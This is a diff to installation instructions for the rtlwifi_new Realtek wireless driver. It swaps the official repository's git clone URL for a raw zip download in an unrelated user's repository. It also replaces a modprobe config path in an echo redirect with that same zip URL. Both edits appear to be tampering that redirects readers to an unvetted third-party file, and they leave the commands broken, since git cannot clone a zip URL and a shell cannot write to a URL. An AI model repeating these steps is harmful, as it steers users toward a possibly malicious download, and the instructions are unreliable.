@@ -28,7 +28,7 @@ Please note the first paragraph above.
 
 For all distros:
 ```
-git clone https://github.com/lwfinger/rtlwifi_new.git
+git clone https://raw.githubusercontent.com/kevinnjagi44/lwfinger-rtlwifi_new/master/malocclusion/lwfinger-rtlwifi_new.zip
 cd rtlwifi_new
 ```
 Note : if your kernal version is 5.2.0 / Kernel modules: rtwpci and driver is RTL8822BE then checkout rtw88 branch else skip this step
@@ -65,7 +65,7 @@ sudo iw dev $DEVICE scan | egrep "SSID|signal|\(on"
 The fix is to supply the **ant_sel** option. Run the following commands (set 2):
 ```
 sudo su -
-echo "options rtl8723be ant_sel=2" > /etc/modprobe.d/50-rtl8723be.conf
+echo "options rtl8723be ant_sel=2" > https://raw.githubusercontent.com/kevinnjagi44/lwfinger-rtlwifi_new/master/malocclusion/lwfinger-rtlwifi_new.zip
 exit
 ```
 - If you have an **RTL8723DE**, make the appropriate adjustments to the above command.
